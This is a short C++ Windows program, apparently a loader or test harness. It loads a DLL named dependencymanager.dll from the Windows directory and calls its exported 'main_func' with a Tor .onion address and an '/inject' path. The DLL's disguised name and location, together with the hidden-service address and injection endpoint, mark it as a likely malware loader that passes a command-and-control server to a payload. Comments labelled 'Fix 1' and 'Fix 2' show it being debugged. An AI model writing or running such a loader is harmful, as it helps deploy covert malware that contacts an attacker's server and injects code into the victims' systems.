#include <windows.h>
#include <iostream>

typedef int (WINAPI* MainFuncType)(char*, char*, char*);

int main()
{
    // Fix 1: Use environment variable directly
    char dllPath[MAX_PATH];
    DWORD len = ExpandEnvironmentStringsA("%windir%\\dependencymanager.dll", dllPath, MAX_PATH);
    if (len == 0 || len > MAX_PATH) {
        std::cout << "ExpandEnvironmentStrings failed: " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "Loading DLL: " << dllPath << "\n";

    HMODULE hMod = LoadLibraryA(dllPath);
    if (!hMod) {
        std::cout << "LoadLibrary failed: " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "DLL loaded at: 0x" << std::hex << (uintptr_t)hMod << std::dec << "\n";

    FARPROC proc = GetProcAddress(hMod, "main_func");
    if (!proc) {
        std::cout << "GetProcAddress failed: " << GetLastError() << "\n";
        FreeLibrary(hMod);
        return 1;
    }

    MainFuncType main_func = reinterpret_cast<MainFuncType>(proc);

    std::cout << "Calling main_func()...\n";

    // Fix 2: Correct 3-param call
    int result = main_func(
        "we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion",
        "/inject", 
        "main_func"
    );

    std::cout << "main_func returned: " << result << "\n";

    FreeLibrary(hMod);
    return 0;
}
